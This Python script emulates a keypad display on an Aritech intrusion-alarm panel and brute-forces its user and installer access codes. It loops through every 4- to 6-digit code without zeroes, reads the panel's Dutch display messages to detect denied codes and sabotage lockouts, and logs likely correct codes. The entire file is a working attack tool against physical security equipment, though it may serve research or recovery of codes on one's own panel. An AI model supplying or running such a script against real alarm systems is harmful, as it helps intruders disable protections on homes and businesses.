#!/usr/bin/env python3

import argparse
import logging
import time
import sys

from protocol import AritechDisplay

FORMAT = '%(asctime)s %(levelname)-8s %(message)s'
logging.basicConfig(format=FORMAT, level=logging.DEBUG, stream=sys.stdout)

parser = argparse.ArgumentParser(
    description="Emulate a display and brute force access codes",
)
AritechDisplay.add_arguments(parser)
parser.add_argument("--first-code", type=int, default=1111, metavar="CODE",
                    help="Starting code. 4/5/6 digits, no zeroes (default %(default)s)")
parser.add_argument("--progress", action="store_true", help="Show some progress info")
args = parser.parse_args()

display = AritechDisplay(args, daemon=True)
display.start()

# These are the Dutch values
ENTER_CODE = "Geef Kode"
ACCESS_DENIED = "Geen Toegang"
SABOTAGE = "Kode Sabotage"
GOODBYES = ["Tot Ziens", "Beëindigen?", "Klaar ?"]


def codes_to_try():
    code = args.first_code
    assert(code >= 1111)

    while code <= 999999:
        if '0' not in str(code):
            yield code
        code += 1


def main():
    codes_found = []

    try:
        for code in codes_to_try():
            # Press zeroes until we get a code prompt
            while True:
                contents = display.wait_for_update(block=False)

                # If all pending updates are cleared, send a 0 button press
                tries = 0
                while contents is None:
                    # Do not spam the queue
                    if display.button_queue_len() == 0:
                        display.send_button(0)

                    contents = display.wait_for_update(timeout=10)
                    if contents is None:
                        logging.warning("Panel is not responding to 0 buttons, will keep trying")

                        if display.button_queue_len() != 0:
                            raise Exception("Panel is no longer processing buttons at all?")
                        tries += 1
                        if tries >= 20:
                            raise Exception("Panel is not responding to 0 buttons?")

                if contents is None:
                    display.send_button(0)
                    contents = display.wait_for_update(timeout=10)

                if contents is None:
                    raise Exception("No response to 0 button?")

                # When we end up in the installer or user menu by
                # guessing the code, pressing 0 moves to the GOODYE
                # option to exit the installer menu, but we need to
                # accept to actually accept it (note that this seems to
                # happen for the installer menu but not the user menu on
                # CD15, and the reverse for CD62).
                if any(bye in contents.display for bye in GOODBYES):
                    display.send_button(AritechDisplay.Buttons.ACCEPT)

                if ENTER_CODE in contents.display:
                    break

                time.sleep(0.5)

            if args.progress:
                logging.info(f"Trying {code}")

            # Send code
            for c in str(code):
                display.send_button(int(c))

            # In a previous version of this script, we directly sent a 0
            # button here to immediately force the display back to idle
            # state (showing a date) when the code was incorrect
            # (correct codes are be accepted as soon as they are
            # entered, so then the extra 0 was ignored). However, at
            # least one time, it was observed that the correct code was
            # *not* detected by the script, presumably because of this 0
            # button press. Additionally, in some cases the 0 button
            # would revert back to different display contents (i.e. show
            # battery failure instead of the date), which would cause
            # every code to be detected as a potentially correct code.
            #
            # So, the 0 button press was removed, and instead we just
            # use a very short timeout below (no reply means access
            # denied).

            # Wait for access denied or other prompt
            while True:
                contents = display.wait_for_update(timeout=0.5)

                if contents is None:
                    # No reply within the timeout? Must be the wrong
                    # code (correct codes reply directly, so no nee to
                    # wait for the access denied message).
                    break

                elif ENTER_CODE in contents.display:
                    continue

                elif ACCESS_DENIED in contents.display:
                    # Even though we do not wait for this message, for
                    # 6-digit codes it is sent directly after the sixth
                    # button.
                    break

                elif SABOTAGE in contents.display:
                    # Sabotage comes in place of access_denied and never
                    # happens for a correct code, so no need to retry
                    # this code.
                    if args.progress:
                        logging.info("Waiting for sabotage timeout")
                    break
                else:
                    # Other responses *probably* mean the code is correct,
                    # so log but then continue because there might be
                    # other codes to be discovered.
                    log = f"Code {code}: Maybe correct, response: {contents.display}"
                    codes_found.append(log)
                    logging.info(log)

                    break
    except (Exception, KeyboardInterrupt) as e:
        print()
        print()
        if not isinstance(e, KeyboardInterrupt):
            print(f"Aborted due to exception: {e}")
            print()
        print(f"Next code to try: {code}")
    else:
        print()
        print()
        print("DONE")

    if codes_found:
        print("Some codes found:")
        print("  " + "\n  ".join(codes_found))
    else:
        print("No codes found")


main()
